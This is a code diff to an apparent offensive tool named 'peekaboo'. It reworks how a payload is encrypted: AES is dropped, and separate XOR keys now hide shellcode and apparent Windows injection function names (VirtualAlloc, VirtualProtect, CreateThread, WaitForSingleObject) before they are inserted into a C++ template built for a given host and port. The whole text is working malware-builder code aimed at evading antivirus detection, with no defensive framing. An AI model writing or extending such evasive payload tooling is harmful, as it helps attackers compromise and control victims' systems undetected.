@@ -21,27 +21,17 @@ class Colors:
 
 class PeekabooEncryptor():
     def __init__(self):
-        self.AES_KEY = os.urandom(16)
-        self.XOR_KEY = self.random()
+        self.PAYLOAD_KEY = self.random()
+        self.FUNC_KEY = self.random()
 
-    def pad(self, s):
-        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+    def payload_key(self):
+        return self.PAYLOAD_KEY
 
-    def aes(self, plaintext):
-        k = hashlib.sha256(self.AES_KEY).digest()
-        iv = 16 * '\x00'
-        plaintext = self.pad(plaintext)
-        cipher = AES.new(k, AES.MODE_CBC, iv)
-        return cipher.encrypt(bytes(plaintext))
+    def func_key(self):
+        return self.FUNC_KEY
 
-    def aes_encrypt(self, data):
-        ciphertext = self.aes(data)
-        key = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in self.AES_KEY) + ' };'
-        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
-        return ciphertext, key
-
-    def xor(self, data):
-        key = str(self.XOR_KEY)
+    def xor(self, data, key):
+        key = str(key)
         l = len(key)
         output_str = ""
 
@@ -52,10 +42,10 @@ class PeekabooEncryptor():
 
         return output_str
 
-    def xor_encrypt(self, data):
-        ciphertext = self.xor(data)
+    def xor_encrypt(self, data, key):
+        ciphertext = self.xor(data, key)
         ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
-        return ciphertext, self.XOR_KEY
+        return ciphertext, key
 
     def random(self):
         length = random.randint(16, 32)
@@ -103,13 +93,12 @@ def run_peekaboo(host, port):
     f_xor = "XOR"
 
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
-    # ciphertext, p_key = encryptor.aes_encrypt(plaintext)
     f_rce, f_xor = encryptor.random(), encryptor.random()
-    ciphertext, p_key = encryptor.xor_encrypt(plaintext)
-    ciphertext_va, va_key = encryptor.xor_encrypt(f_va)
-    ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp)
-    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth)
-    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso)
+    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
+    ciphertext_va, va_key = encryptor.xor_encrypt(f_va, encryptor.func_key())
+    ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp, encryptor.func_key())
+    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
+    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
 
     tmp = open("peekaboo.cpp", "rt")
     data = tmp.read()
